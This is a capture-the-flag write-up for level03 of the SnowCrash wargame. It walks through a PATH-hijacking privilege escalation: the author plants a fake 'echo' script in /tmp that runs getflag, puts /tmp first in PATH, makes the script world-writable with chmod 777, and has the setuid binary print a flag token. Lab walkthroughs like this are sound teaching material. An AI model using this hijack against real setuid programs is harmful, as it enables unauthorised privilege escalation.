
> in this level we got a file again so let's try to work with it:
--------------------------------
level03@SnowCrash:~$ ./level03
Exploit me
--------------------------------

> after executing it we got this message "Exploit me"
so we just need literally to do what he asked

> let's use strings and find where this exploit me is:
--------------------------------
level03@SnowCrash:~$ strings level03 | grep "Exploit me"
/usr/bin/env echo Exploit me
--------------------------------

> perfect so the program use echo to print Exploit me
so we need to override echo to let it give us our flag

> firstly we create an echo file in tmp and put getflag in it:
--------------------------------
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
--------------------------------

> now we need to add it to the path, specifically before the path
so it override system echo:
--------------------------------
level03@SnowCrash:~$ export PATH=/tmp:$PATH
--------------------------------

> now let's run level03 to check:
--------------------------------
level03@SnowCrash:~$ ./level03
Exploit me
--------------------------------

> we didn't understand at first why it still didn't work
but after trying the fix was easy we needed just to give permessions to the file
--------------------------------
level03@SnowCrash:~$ chmod 777 /tmp/echo
--------------------------------

> now let's run level03 to check again:
--------------------------------
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password:
level04@SnowCrash:~$
--------------------------------
